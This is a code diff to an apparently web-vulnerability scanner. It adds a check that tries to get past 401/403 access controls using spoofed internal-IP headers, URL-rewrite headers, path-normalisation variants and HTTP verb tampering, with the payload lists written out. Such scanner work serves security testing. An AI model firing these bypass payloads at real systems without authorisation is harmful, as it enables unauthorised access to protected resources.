@@ -8,6 +8,8 @@ resources can be accessed:
   3. By enumerating numeric/UUID IDs in URLs (IDOR – horizontal escalation)
   4. By probing query/body parameters that carry user/object identifiers (③)
   5. With a second user-account session (cross-account IDOR / vertical test)
+  6. By bypassing a 401/403 access control with path-normalisation,
+     trusted-IP spoofing headers, URL-rewrite headers or HTTP verb tampering
 
 Check types emitted
 -------------------
@@ -16,6 +18,7 @@ Check types emitted
   privesc_horizontal  — IDOR via URL path ID manipulation
   privesc_param_idor  — IDOR via query/body parameter manipulation (NEW ③)
   privesc_cross_acct  — cross-account access confirmed with a second session (NEW A)
+  privesc_bypass      — an enforced 401/403 access control was bypassed
 
 Trigger conditions
 ------------------
@@ -110,6 +113,61 @@ _HEADERS = {
     ),
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 }
+
+# ---------------------------------------------------------------------------
+# 401/403 access-control bypass payloads
+# ---------------------------------------------------------------------------
+
+# Headers commonly abused to spoof a trusted origin / internal IP and slip past
+# gateway- or middleware-level access control.
+_BYPASS_HEADERS: tuple[dict, ...] = (
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Forwarded-For": "localhost"},
+    {"X-Forwarded-Host": "127.0.0.1"},
+    {"X-Custom-IP-Authorization": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
+    {"X-Remote-IP": "127.0.0.1"},
+    {"X-Remote-Addr": "127.0.0.1"},
+    {"X-Client-IP": "127.0.0.1"},
+    {"X-Real-IP": "127.0.0.1"},
+    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "127.0.0.1"},
+)
+
+# Headers some reverse proxies honour to *rewrite* the requested path: the
+# request is sent to a benign URL while the header points at the protected one.
+_REWRITE_HEADERS: tuple[str, ...] = ("X-Original-URL", "X-Rewrite-URL")
+
+# Alternative HTTP verbs to try when a GET is blocked (verb / method tampering).
+_TAMPER_METHODS: tuple[str, ...] = ("POST", "PUT", "PATCH", "OPTIONS")
+
+
+def _path_bypass_variants(path: str) -> list[str]:
+    """Return path-normalisation tricks that frequently bypass naive ACL prefix
+    matching (e.g. a rule that only blocks the exact string '/admin')."""
+    base = (path or "/").rstrip("/")
+    if not base:
+        return []
+    segs = base.split("/")
+    last = segs[-1]
+    prefix = "/".join(segs[:-1])
+    variants = {
+        base + "/",
+        base + "//",
+        base + "/.",
+        base + "/./",
+        base + "/..;/",
+        base + ";/",
+        base + "%20",
+        base + "%09",
+        base + ".json",
+        base + ".html",
+        f"{prefix}//{last}",
+        f"{prefix}/./{last}",
+        f"{prefix}/{last};",
+    }
+    if last and last.lower() != last.upper():
+        variants.add(f"{prefix}/{last.upper()}")
+    return [v for v in variants if v and v != base]
 
 
 # ---------------------------------------------------------------------------
@@ -302,6 +360,12 @@ class PrivEscScanner(BaseScanner):
         if unauth_finding:
             findings.append(unauth_finding)
             await self._emit(unauth_finding)
+
+        # ── Test 1b: 401/403 access-control bypass ────────────────────
+        if is_privileged:
+            for bf in await self._test_forbidden_bypass(url, is_privileged, timeout):
+                findings.append(bf)
+                await self._emit(bf)
 
         # ── Test 2: Low-privilege vertical escalation ─────────────────
         low_priv_cookies: str = getattr(self.engine, "low_priv_cookies", "")
@@ -516,6 +580,100 @@ class PrivEscScanner(BaseScanner):
             request={"url": url, "method": "GET", "headers": {"Cookie": "<low-priv-token>"}},
             response={"status": status, "url": url},
         )
+
+    # ------------------------------------------------------------------
+    # Test 1b: 401/403 access-control bypass
+    # ------------------------------------------------------------------
+
+    async def _test_forbidden_bypass(
+        self,
+        url: str,
+        is_privileged: bool,
+        timeout: float,
+    ) -> list[Finding]:
+        """When a privileged path enforces access control (401/403 for a bare
+        request), probe common bypass techniques: path normalisation,
+        trusted-IP spoofing headers, URL-rewrite headers and verb tampering.
+        Returns at most one finding (the first confirmed bypass)."""
+        if not is_privileged:
+            return []
+
+        parsed = urlparse(url)
+        path = parsed.path or "/"
+
+        # Baseline must actually be blocked — otherwise the unauth/vertical
+        # tests already cover open access and there is nothing to "bypass".
+        base_status, _ = await self._raw_request("GET", url, timeout)
+        if base_status not in (401, 403):
+            return []
+
+        def _make(technique: str, candidate_url: str, status: int,
+                  body: str, request: dict) -> Finding:
+            return Finding(
+                check_type="privesc_bypass",
+                severity="high",
+                url=url,
+                field_name=f"(access-control bypass: {technique})",
+                payload=candidate_url,
+                evidence=(
+                    f"Access-control bypass: the canonical request to '{path}' "
+                    f"was blocked (HTTP {base_status}), but {technique} reached "
+                    f"the resource (HTTP {status}, {len(body)} bytes) without "
+                    f"valid authorization. The access control appears to be "
+                    f"enforced only on the exact/canonical request shape."
+                ),
+                request=request,
+                response={
+                    "status": status,
+                    "url": candidate_url,
+                    "baseline_status": base_status,
+                },
+            )
+
+        # 1) Path-normalisation bypass
+        for variant_path in _path_bypass_variants(path):
+            candidate_url = urlunparse(parsed._replace(path=variant_path))
+            status, body = await self._raw_request("GET", candidate_url, timeout)
+            if self._bypass_succeeded(status, body):
+                return [_make(
+                    f"path normalisation '{variant_path}'", candidate_url,
+                    status, body,
+                    {"url": candidate_url, "method": "GET", "headers": {}},
+                )]
+
+        # 2) Trusted-origin / internal-IP spoofing headers
+        for hdr in _BYPASS_HEADERS:
+            status, body = await self._raw_request("GET", url, timeout, headers=hdr)
+            if self._bypass_succeeded(status, body):
+                return [_make(
+                    f"spoofed header {', '.join(hdr)}", url, status, body,
+                    {"url": url, "method": "GET", "headers": dict(hdr)},
+                )]
+
+        # 3) URL-rewrite headers (request the root, point the header at the path)
+        root_url = urlunparse(parsed._replace(path="/", query="", fragment=""))
+        rewrite_target = path + (f"?{parsed.query}" if parsed.query else "")
+        for hname in _REWRITE_HEADERS:
+            status, body = await self._raw_request(
+                "GET", root_url, timeout, headers={hname: rewrite_target}
+            )
+            if self._bypass_succeeded(status, body):
+                return [_make(
+                    f"rewrite header {hname}", root_url, status, body,
+                    {"url": root_url, "method": "GET",
+                     "headers": {hname: rewrite_target}},
+                )]
+
+        # 4) HTTP verb / method tampering
+        for method in _TAMPER_METHODS:
+            status, body = await self._raw_request(method, url, timeout)
+            if self._bypass_succeeded(status, body):
+                return [_make(
+                    f"{method} method tampering", url, status, body,
+                    {"url": url, "method": method, "headers": {}},
+                )]
+
+        return []
 
     # ------------------------------------------------------------------
     # Test 3: S-6 — Horizontal privilege escalation via path ID
@@ -983,6 +1141,45 @@ class PrivEscScanner(BaseScanner):
         except Exception:
             return 0, ""
 
+    async def _raw_request(
+        self,
+        method: str,
+        url: str,
+        timeout: float,
+        *,
+        headers: Optional[dict] = None,
+        cookies: str = "",
+    ) -> tuple[int, str]:
+        """Issue an arbitrary-method request (no redirect following) with
+        optional extra headers. Used by the 401/403 bypass probes."""
+        hdrs = {**_HEADERS, **_engine_custom_headers(self.engine)}
+        if headers:
+            hdrs.update(headers)
+        if cookies:
+            hdrs["Cookie"] = cookies
+        try:
+            async with httpx.AsyncClient(
+                follow_redirects=False,
+                timeout=timeout,
+                headers=hdrs,
+                **self._client_transport_kwargs(),
+            ) as client:
+                resp = await client.request(method, url)
+                return resp.status_code, resp.text[:8000]
+        except Exception:
+            return 0, ""
+
+    def _bypass_succeeded(self, status: int, body: str) -> bool:
+        """A bypass attempt counts only if the resource was actually served:
+        a 2xx with substantial content that is neither an auth gate nor a
+        not-found page."""
+        return (
+            200 <= status < 300
+            and len(body or "") >= 50
+            and not _is_auth_gate(body or "")
+            and not NON_RESOURCE_RE.search(body or "")
+        )
+
     async def _request_form(
         self,
         method: str,
@@ -1014,6 +1211,19 @@ class PrivEscScanner(BaseScanner):
             url = finding.request.get("url") or finding.url
             status, body = await self._get(url, "", timeout)
             return self._accessible_response(status, body)
+
+        if finding.check_type == "privesc_bypass":
+            req = finding.request or {}
+            candidate_url = req.get("url") or finding.url
+            method = req.get("method", "GET")
+            headers = {
+                k: v for k, v in (req.get("headers") or {}).items()
+                if k.lower() != "cookie"
+            }
+            status, body = await self._raw_request(
+                method, candidate_url, timeout, headers=headers
+            )
+            return self._bypass_succeeded(status, body)
 
         if finding.check_type == "privesc_vertical":
             cookies = getattr(self.engine, "low_priv_cookies", "")
